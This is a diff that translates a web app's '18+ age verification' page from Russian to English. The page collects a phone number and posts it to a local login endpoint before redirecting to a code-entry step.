@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title data-i18n="enter_phone">Введите номер телефона</title>
+    <title data-i18n="enter_phone">Enter phone number</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
 <body>
@@ -11,30 +11,30 @@
         <div class="glass">
             <div class="emoji-18plus">🔞</div>
 
-            <h1 class="auth-title" data-i18n="verify">Проверка возраста 18+</h1>
+            <h1 class="auth-title" data-i18n="verify">Age verification 18+</h1>
             
-            <p class="auth-subtitle" data-i18n="enter_phone">Введите номер телефона</p>
+            <p class="auth-subtitle" data-i18n="enter_phone">Enter your phone number</p>
 
             <form id="authForm">
                 <div class="input-group">
-                    <label class="input-label" data-i18n="enter_phone">Номер телефона</label>
+                    <label class="input-label" data-i18n="enter_phone">Phone number</label>
                     <input 
                         type="tel" 
                         class="input-field" 
                         id="phone" 
-                        placeholder="79991234567"
+                        placeholder="1234567890"
                         data-i18n-attr="phone_placeholder:placeholder"
                         required
                     >
-                    <p class="help-text">Используйте формат: +79991234567 или 79991234567</p>
+                    <p class="help-text">Use format: +1234567890</p>
                 </div>
 
                 <button type="submit" class="btn btn-primary" data-i18n="send_code">
-                    Отправить код
+                    Send code
                 </button>
             </form>
 
-            <a href="/" class="back-link" data-i18n="back">← Назад</a>
+            <a href="/" class="back-link" data-i18n="back">← Back</a>
 
             <div id="errorMessage" class="error-message" style="display: none;"></div>
         </div>
@@ -47,13 +47,13 @@
             const phone = document.getElementById('phone').value;
             
             if (!phone) {
-                alert(window.i18n?.t('phone_required') || 'Введите номер телефона');
+                alert(window.i18n?.t('phone_required') || 'Enter phone number');
                 return;
             }
 
             const submitBtn = this.querySelector('button[type="submit"]');
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="spinner"></span> ' + (window.i18n?.t('send_code') || 'Отправляем...');
+            submitBtn.innerHTML = '<span class="spinner"></span> ' + (window.i18n?.t('send_code') || 'Sending...');
 
             try {
                 const response = await fetch('/login', {
@@ -68,17 +68,17 @@
                     window.location.href = '/code';
                 } else {
                     const error = await response.json();
-                    document.getElementById('errorMessage').textContent = error.error || 'Ошибка при отправке кода';
+                    document.getElementById('errorMessage').textContent = error.error || 'Error sending code';
                     document.getElementById('errorMessage').style.display = 'block';
                     submitBtn.disabled = false;
-                    submitBtn.innerHTML = window.i18n?.t('send_code') || 'Отправить код';
+                    submitBtn.innerHTML = window.i18n?.t('send_code') || 'Send code';
                 }
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('errorMessage').textContent = 'Ошибка сервера';
+                document.getElementById('errorMessage').textContent = 'Server error';
                 document.getElementById('errorMessage').style.display = 'block';
                 submitBtn.disabled = false;
-                submitBtn.innerHTML = window.i18n?.t('send_code') || 'Отправить код';
+                submitBtn.innerHTML = window.i18n?.t('send_code') || 'Send code';
             }
         });
     </script>
